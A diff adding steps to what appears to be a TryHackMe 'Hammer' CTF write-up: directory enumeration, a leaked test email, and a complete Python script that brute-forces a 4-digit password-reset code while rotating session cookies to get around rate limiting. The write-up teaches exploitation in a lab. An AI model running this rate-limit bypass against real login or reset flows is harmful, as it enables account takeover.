@@ -28,7 +28,76 @@ What is the flag value after logging in to the dashboard?
 6. Now, we can run \`dirb http://MACHINE\_IP:1337 hmr_big.txt\`.
 7. We will find some directories including \`hmr_css\`, \`hmr_images\`, \`hmr_js\`. However, we are interested in the \`hmr_logs\` since it might give us something useful.
 8. After accessing \`http://MACHINE\_IP:1337/hmr_logs\`, we will find a log file that contains some errors in which one of the username \`tester@hammer.thm\` was exposed.
-9.
+9. Now, we can try to bypass the login using the forgot password feature. We will enter the email and use Burp Suite to intercept the request. We will see that the request have a \`recovery\_code\` and a \`s\` body parameter.
+10. Personally, I tried the sniper attack in order to try to brute force the recovery code but it was not successful due to the \`Rate-Limit-Pending\`. After struggling for 2 hours, I decided to look for help on others write-ups and come across **0xb0b** write-up on TryHackMe.
+11. In the write-up, I found the script that he used to bypass the recovery code and I modify the script to fit my current situation.
+\`\`\`
+	import subprocess
+	
+	def get_phpsessid():
+	    # Request Password Reset and retrieve the PHPSESSID cookie
+	    reset_command = [
+	        "curl", "-X", "POST", "http://MACHINE\_IP:1337/reset_password.php",
+	        "-d", "email=tester%40hammer.thm",
+	        "-H", "Content-Type: application/x-www-form-urlencoded",
+	        "-v"
+	    ]
+	
+	    # Execute the curl command and capture the output
+	    response = subprocess.run(reset_command, capture_output=True, text=True)
+	
+	    # Extract PHPSESSID from the response
+	    phpsessid = None
+	    for line in response.stderr.splitlines():
+	        if "Set-Cookie: PHPSESSID=" in line:
+	            phpsessid = line.split("PHPSESSID=")[1].split(";")[0]
+	            break
+	
+	    return phpsessid
+	
+	def submit_recovery_code(phpsessid, recovery_code):
+	    # Submit Recovery Code using the retrieved PHPSESSID
+	    recovery_command = [
+	        "curl", "-X", "POST", "http://MACHINE\_IP:1337/reset_password.php",
+	        "-d", f"recovery_code={recovery_code}&s=180",
+	        "-H", "Content-Type: application/x-www-form-urlencoded",
+	        "-H", f"Cookie: PHPSESSID={phpsessid}",
+	        "--silent"
+	    ]
+	
+	    # Execute the curl command for recovery code submission
+	    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
+	    return response_recovery.stdout
+	
+	def main():
+	    phpsessid = get_phpsessid()
+	    if not phpsessid:
+	        print("Failed to retrieve initial PHPSESSID. Exiting...")
+	        return
+	    
+	    for i in range(10000):
+	        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string
+	
+	        if i % 7 == 0:  # Every 7th request, get a new PHPSESSID
+	            phpsessid = get_phpsessid()
+	            if not phpsessid:
+	                print(f"Failed to retrieve PHPSESSID at attempt {i}. Retrying...")
+	                continue
+	        
+	        response_text = submit_recovery_code(phpsessid, recovery_code)
+	        word_count = len(response_text.split())
+	
+	        if word_count != 148:
+	            print(f"Success! Recovery Code: {recovery_code}")
+	            print(f"PHPSESSID: {phpsessid}")
+	            print(f"Response Text: {response_text}")
+	            break
+	
+	if __name__ == "__main__":
+	    main()
+	
+\`\`\`
+12. 
 
 
 What is the content of the file **/home/ubuntu/flag.txt**?
